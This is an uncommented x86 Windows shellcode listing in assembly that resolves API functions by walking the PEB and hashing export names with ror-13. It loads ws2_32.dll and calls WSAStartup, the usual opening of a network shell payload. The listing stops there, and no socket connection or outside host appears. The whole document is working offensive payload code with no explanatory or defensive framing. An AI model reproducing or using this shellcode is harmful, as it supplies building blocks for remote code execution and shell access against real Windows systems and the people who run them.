shellcode:
    fcmovnb  %st(0),%st
    fnstenv  -0xc(%esp) # get eip
    pop    %eax
    call   f0 # main
    pusha
    mov    %esp,%ebp
    xor    %eax,%eax
    mov    %fs:0x30(%eax),%edx # get PEB
    mov    0xc(%edx),%edx
    mov    0x14(%edx),%edx
f7:
    mov    0x28(%edx),%esi
    movzwl 0x26(%edx),%ecx
    xor    %edi,%edi
f2: # module hash
    lods   %ds:(%esi),%al
    cmp    $0x61,%al
    jl     f1
    sub    $0x20,%al # upcase char
f1:
    ror    $0xd,%edi
    add    %eax,%edi
    loop   f2
    push   %edx
    push   %edi
    mov    0x10(%edx),%edx
    mov    0x3c(%edx),%ecx
    mov    0x78(%ecx,%edx,1),%ecx
    jecxz  f5
    add    %edx,%ecx
    push   %ecx
    mov    0x20(%ecx),%ebx
    add    %edx,%ebx
    mov    0x18(%ecx),%ecx
f4:
    jecxz  f6
    dec    %ecx
    mov    (%ebx,%ecx,4),%esi
    add    %edx,%esi
    xor    %edi,%edi
f3:
    lods   %ds:(%esi),%al
    ror    $0xd,%edi
    add    %eax,%edi
    cmp    %ah,%al
    jne    f3
    add    -0x8(%ebp),%edi
    cmp    0x24(%ebp),%edi
    jne    f4  
    pop    %eax
    mov    0x24(%eax),%ebx
    add    %edx,%ebx
    mov    (%ebx,%ecx,2),%cx
    mov    0x1c(%eax),%ebx
    add    %edx,%ebx
    mov    (%ebx,%ecx,4),%eax
    add    %edx,%eax
    mov    %eax,0x24(%esp)
    pop    %ebx
    pop    %ebx
    popa   
    pop    %ecx
    pop    %edx
    push   %ecx
    jmp    *%eax
f6:
    pop    %edi
f5:
    pop    %edi
    pop    %edx
    mov    (%edx),%edx
    jmp    f7
f0:
    pop    %ebp
    push   $0x3233
    push   $0x5f327377
    push   %esp
    push   $0x726774c # kernel32.dll!LoadLibraryA
    call   *%ebp
    mov    $0x190,%eax
    sub    %eax,%esp
    push   %esp
    push   %eax
    push   $0x6b8029
    call   *%ebp # ws2_32.dll!WSAStartup

